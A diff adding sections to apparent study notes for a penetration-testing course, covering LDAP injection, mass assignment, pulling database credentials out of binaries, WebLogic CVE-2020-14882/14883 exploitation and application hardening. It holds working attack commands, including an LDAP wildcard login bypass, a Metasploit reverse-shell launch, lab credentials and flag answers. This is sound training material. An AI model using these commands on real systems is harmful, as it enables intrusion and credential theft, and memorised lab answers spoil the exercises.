@@ -1321,3 +1321,268 @@ gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp
 - Target: `10.129.48.213` (ACADEMY-ACA-BOUNTY), IIS 7.5 on port 80
 - Short name found by scanner: `TRANSF~1.ASP`
 - Full filename (gobuster): `transfer.aspx`
+
+---
+
+## Section 26 — LDAP (Injection)
+
+### What LDAP Is
+- Lightweight Directory Access Protocol — protocol to access/manage hierarchical directory data (users, groups, computers, printers)
+- Client-server, messages encoded in ASN.1 over TCP/IP; default ports **389** (cleartext) and **636** (LDAPS/SSL)
+- Not encrypted by default — LDAPS or StartTLS required for encryption
+- Two common implementations: **OpenLDAP** (open-source, cross-platform) and **Microsoft Active Directory** (Windows, adds Kerberos/GPO/SSO)
+- LDAP is a *protocol*; AD is a *directory service* that uses LDAP as one of its protocols
+
+### LDAP vs Active Directory
+- LDAP: open, cross-platform, flexible/extensible schema, multiple auth mechanisms (simple bind, SASL)
+- AD: proprietary Windows, predefined X.500-based schema, primary auth is Kerberos (also NTLM, LDAP over SSL/TLS)
+
+### Request/Response Anatomy
+- Request: session connection (port 389/636), request type (bind/search/add/etc.), request parameters (DN, scope, filter, attributes), request ID
+- Response: response type, result code (success/why), matched DN, referral URL, response data
+
+### ldapsearch (query utility)
+```
+ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+```
+- `-H` LDAP URI (host:port)
+- `-D` bind DN (who you authenticate as)
+- `-w` bind password
+- `-b` base DN (where to start the search)
+- final arg = search filter, e.g. `(mail=john.doe@example.com)`
+- Successful response returns matching entry's DN + attributes and `result: 0 Success`
+
+### LDAP Injection
+- Exploits web apps that build LDAP queries (auth or user lookup) from unsanitised input
+- Analogous to SQLi but targets the LDAP directory instead of a database
+- Special characters / operators used to test:
+
+| Input | Meaning |
+|---|---|
+| `*` | Wildcard — matches any number of characters |
+| `( )` | Group expressions |
+| `\|` | Logical OR |
+| `&` | Logical AND |
+| `(cn=*)` / `(objectClass=*)` | Always-true condition for auth/authz bypass |
+
+**Auth bypass example.** App query:
+```
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+```
+- Inject `*` into `$username` → matches any account (with a given password)
+- Inject `*` into `$password` → matches any account regardless of password
+- Injecting `*` into **both** username and password → filter becomes always-true → logs in as the first/any matching account, bypassing auth entirely
+
+### Enumeration Approach
+- `nmap -p- -sC -sV --open --min-rate=1000 <target>` — full port sweep
+- Indicator: **HTTP (80) + LDAP/OpenLDAP (389) on the same host** → assume the web login authenticates against LDAP → test wildcard injection
+```
+nmap -p- -sC -sV --open --min-rate=1000 10.129.205.18
+```
+
+### What Works / What Doesn't
+- Wildcard `*` in both username and password bypasses the login form when the app passes input straight into an LDAP filter
+- Mitigation (why it sometimes fails): input validation stripping `*` / parameterised LDAP queries
+
+### Lab Answers
+- Target: `10.129.205.18` (ACADEMY-ACA-SLAP) — Apache 2.4.41 on port 80, OpenLDAP on 389
+- Login bypass: username `*`, password `*`
+- One-liner: `curl -s -c /tmp/ldap.txt -b /tmp/ldap.txt -L -d "username=*&password=*" http://10.129.205.18/ | grep -i "powered by"`
+- Q1: website "Powered by" → **w3.css**
+
+---
+
+## Section 27 — Web Mass Assignment Vulnerabilities
+
+### What It Is
+- Frameworks offer mass-assignment to reduce dev work: a whole set of user-submitted form fields is bound directly to an object/DB record
+- Vulnerable when there is **no whitelist** on which fields the user may set
+- Attacker adds extra parameters to the request → sets critical unprotected attributes (e.g. `admin`, `confirmed`) → privilege escalation / bypass / data tampering
+- Common in Ruby on Rails (`attr_accessible`) but applies to any framework that binds request params to models
+
+### Rails Example
+```ruby
+class User < ActiveRecord::Base
+  attr_accessible :username, :email
+end
+```
+- Only `username`/`email` are meant to be settable, but sending `"admin" => true` in the params can still flip `admin` if not protected → attacker registers as admin
+
+### Exploiting (Asset Manager lab pattern)
+- App has source code available (white-box). Registration inserts a row `(username, password, cond)` where `cond` (the "confirmed/approved" flag) defaults to False
+- Login only succeeds if the confirmed flag `k` is truthy:
+```python
+for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
+  if k:
+    session['user']=i
+    return redirect("/home",code=302)
+```
+- Registration sets the flag True **only if** a specific form field is present:
+```python
+try:
+  if request.form['confirmed']:
+    cond=True
+except:
+  cond=False
+```
+- **Exploit:** add the extra field to the registration POST — `username=new&password=test&confirmed=test` — any non-empty value makes `cond=True`, so the account is pre-approved and you skip admin approval
+- Capture the `/register` POST in Burp, inject the extra parameter, then log in with the new creds
+
+### Key Insight
+- The vulnerable parameter is whatever field the registration code reads from `request.form[...]` to set the approval/privilege flag. Find it by reading the source (`request.form['<name>']`)
+- Any truthy/non-empty value works — the code only checks presence, not the value
+
+### Prevention
+- Explicitly whitelist assignable fields (Rails strong params: `params.require(:user).permit(:username, :email)`)
+
+### Lab Answers
+- Target: `10.129.205.15` (ACADEMY-ACA-CLAMP); SSH `root` / `!x4;EW[ZLwmDx?=w`
+- Q1: crucial parameter (renamed from `confirmed`) → **active** (`/opt/asset-manager/app.py` line 50: `if request.form['active']:`)
+- Exploit form body: `username=new&password=test&active=test`
+- Note: line 70 `expr=request.form['sp']` — a separate feature (likely eval/SSTI-style), not the mass-assignment flag
+
+---
+
+## Section 28 — Attacking Applications Connecting to Services
+
+### Concept
+- Apps that connect to backend services (SQL, APIs) embed **connection strings with credentials**
+- If the binary/assembly is recoverable, those creds can be extracted → reuse for lateral movement / privilege escalation / password spraying
+- Two file types covered: Linux **ELF** executables (gdb) and Windows **.NET DLL** assemblies (dnSpy)
+
+### ELF Examination — gdb / PEDA
+- PEDA = Python Exploit Development Assistance for GDB (extends GNU Debugger)
+- Running the binary shows it tries to connect to a DB instance (unixODBC driver messages)
+- Strings are stored **chunked and byte-reversed** (endianness) → `strings` alone won't reassemble the connection string cleanly; debug at runtime instead
+
+Workflow:
+```
+gdb ./octopus_checker
+```
+```
+set disassembly-flavor intel
+disas main
+```
+- Look for the `call ... <SQLDriverConnect@plt>` instruction — the fully assembled connection string sits in a register at that moment
+- Set a breakpoint on the SQLDriverConnect call, run, and read the string from **RDX**:
+```
+b SQLDriverConnect
+run
+x/s $rdx
+```
+- (Section used `b *<address_of_SQLDriverConnect@plt>`; breaking on the symbol name is equivalent)
+- RDX reveals e.g.:
+  `DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;`
+- Extract `UID` (username) and `PWD` (password)
+
+### DLL Examination — dnSpy (.NET)
+- `Get-FileMetaData .\MultimasterAPI.dll` → identifies it as a .NET Framework assembly, reveals API endpoints/paths
+- Open in **dnSpy** (reads/edits/debugs .NET C#/VB source)
+- Navigate to the controller (e.g. `MultimasterAPI.Controllers -> ColleagueController`) → the DB connection string with the password is in the source
+- After recovering creds: connect to MSSQL, or password-spray other services on the network
+
+### What Works / What Doesn't
+- Runtime debugging (breakpoint + register read) beats static `strings` when the string is split/reversed
+- Recovered DB creds are frequently **reused** — always test them against other users/services on the same network
+
+### Lab Answers
+- Target: `10.129.205.20` (ACADEMY-ACA-ROLLOUT); SSH `htb-student` / `HTB_@cademy_stdnt!`; binary at `/htb/rollout/octopus_checker`
+- One-shot: `gdb -q -batch -ex "break SQLDriverConnect" -ex "run" -ex "x/s \$rdx" /home/htb-student/octopus_checker`
+- Connection string in RDX: `DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;`
+- Q1: local DB creds → **SA:N0tS3cr3t!**
+
+---
+
+## Section 29 — Other Notable Applications
+
+### Takeaway
+- The module taught a **methodology** that transfers to any app: enumerate the network → screenshot/triage (EyeWitness) → fingerprint app + version → default creds / known CVE / abuse built-in functionality → RCE → loot creds for lateral movement
+- Dig through scan noise; scanners miss weak/default creds and open Git repos. Curiosity about unknown apps is the edge.
+
+### Honorable Mentions (apps worth watching for)
+| Application | Abuse Info |
+|---|---|
+| **Axis2** | Often sits on top of Tomcat. If Tomcat RCE fails, try default/weak Axis2 admin creds → upload webshell as an **AAR** file (Axis2 service). Metasploit module exists. |
+| **Websphere** | Many CVEs. Admin console default creds e.g. `system:manager` → deploy **WAR** (like Tomcat) → web/reverse shell RCE. |
+| **Elasticsearch** | Various CVEs; forgotten installs. HTB box *Haystack*. |
+| **Zabbix** | Monitoring. SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE. Built-in functionality → RCE via **Zabbix API**. HTB box *Zipper*. |
+| **Nagios** | Monitoring. RCE, root privesc, SQLi, code injection, stored XSS. Default creds `nagiosadmin:PASSW0RD`; fingerprint version. |
+| **WebLogic** | Java EE app server, 190+ CVEs. Many unauth RCE exploits 2007–2021, mostly **Java deserialization**. |
+| **Wikis/Intranets** | MediaWiki, SharePoint, custom intranets. Check known vulns + document/search features → often leak valid creds. |
+| **DotNetNuke (DNN)** | .NET/C# CMS. Auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download. |
+| **vCenter** | Manages ESXi. Weak creds + Apache Struts 2 RCE; unauth OVA upload **CVE-2021-22005**. Windows/Linux appliance; often runs as SYSTEM or even domain admin. |
+
+### General Rule
+- Default password + built-in functionality is usually all that's needed.
+
+### Lab Exercise (target 10.129.201.102 / APP05, hostname MS01)
+**Enumeration** — `nmap -p- -sC -sV --open --min-rate=1000 10.129.201.102`:
+- 21 FTP (anon allowed; root = IIS wwwroot with web.config/iisstart.png/aspnet_client), 80/443 IIS 10.0, 135/139/445 SMB, 5985 WinRM
+- **7001 → `Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)`** ← the target app
+
+**Vuln:** WebLogic 12.2.1.3 → **CVE-2020-14882** (console auth bypass) + **CVE-2020-14883** (RCE). Affects 10.3.6, 12.1.3, 12.2.1.3, 12.2.1.4, 14.1.1.
+
+**Auth-bypass verification** (302 → `console.portal?...HomePage1` + `ADMINCONSOLESESSION` cookie = success; a bounce to LoginForm.jsp = fail):
+```
+curl -s -i "http://10.129.201.102:7001/console/css/%252e%252e%252fconsole.portal" | head -20
+```
+
+**Exploitation — Metasploit** (module matches the exact CVE chain; searchsploit results were all for older T3/AsyncResponse CVEs — wrong):
+```
+msfconsole -q -x "use exploit/multi/http/weblogic_admin_handle_rce; set RHOSTS 10.129.201.102; set RPORT 7001; set SSL false; set LHOST tun0; set LPORT 4444; run"
+```
+- Default target **4 (PowerShell Stager)** + payload `windows/x64/meterpreter/reverse_https` worked out of the box
+- AutoCheck reported "target is vulnerable. Path traversal successful."
+- Stager fired repeatedly → many duplicate sessions (harmless); used session 2
+
+**Post-exploitation:**
+- `getuid` → **NT AUTHORITY\SYSTEM** (WebLogic ran as SYSTEM — no privesc needed)
+- Meterpreter uses `cat`, not `type`: `cat C:\\Users\\Administrator\\Desktop\\flag.txt`
+
+**Answers:**
+- Q1: running application → **Oracle WebLogic Server** (WebLogic)
+- Q2: flag → **w3b_l0gic_RCE!**
+
+**Gotchas:**
+- WebLogic default port is **7001**; nmap `weblogic-t3-info` script prints the exact version
+- Verify CVE-2020-14882 with the double-encoded path `%252e%252e%252f`; success = redirect to HomePage1, not LoginForm
+- searchsploit "WebLogic" is noisy — pick the exploit that matches BOTH the version and the confirmed vuln, not just the product
+- In meterpreter, read files with `cat` (Windows `type` is not a meterpreter command)
+
+---
+
+## Section 30 — Application Hardening (defensive)
+
+### Foundation: Application Inventory
+- First step for any org: build an accurate inventory of internal + external-facing apps
+- Blue teams can use pentest tooling (Nmap, EyeWitness) to build/maintain it
+- Inventory exposes: shadow IT / unauthorized installs, deprecated apps, and licensing pitfalls (e.g. Splunk trial → free reverting to **no-auth**)
+- "Without knowing what exists, we can't protect it"
+
+### General Hardening Tips
+- **Secure authentication:** strong passwords, change/disable default admin accounts, create custom admin accounts, mandatory 2FA for admins
+- **Access controls:** don't expose login pages to the internet without a business reason; restrict file/folder upload & deploy permissions
+- **Disable unsafe features:** e.g. WordPress PHP code editing (theme editor → RCE)
+- **Regular updates:** patch promptly
+- **Backups:** website + DB backups to a secondary location for fast recovery
+- **Security monitoring:** monitoring plugins/tools + a WAF as an extra layer (not a silver bullet)
+- **LDAP/AD SSO integration:** centralizes creds, adds auditing, fine-grained password policy, fewer passwords
+
+### Application-Specific Hardening
+| Application | Category | Measure |
+|---|---|---|
+| WordPress | Security monitoring | WordFence plugin (monitoring, blocking, country block, 2FA) |
+| Joomla | Access controls | AdminExile — secret key required on admin URL (`/administrator?thisismysecretkey`) |
+| Drupal | Access controls | Disable/hide/move the admin login page |
+| Tomcat | Access controls | Restrict Manager/Host-Manager to localhost; else IP whitelist + strong pass + non-standard username |
+| Jenkins | Access controls | Matrix Authorization Strategy plugin |
+| Splunk | Regular updates | Change default password; ensure proper licensing so auth is enforced |
+| PRTG | Secure authentication | Stay updated; change default password |
+| osTicket | Access controls | Limit internet access |
+| GitLab | Secure authentication | Sign-up restrictions: admin approval, allow/deny domains |
+
+### Conclusion / Key Themes
+- Apps are the bulk of external-pentest attack surface and are often overlooked
+- Orgs patch well but miss weak creds (Tomcat Manager, printers with default creds leaking LDAP), which become footholds
+- Be careful what's exposed to the internet (public GitLab repos, internet-facing ticketing systems)
+- The **three skills assessments** (Sections 31–33) test the full discovery → enumeration → exploitation process
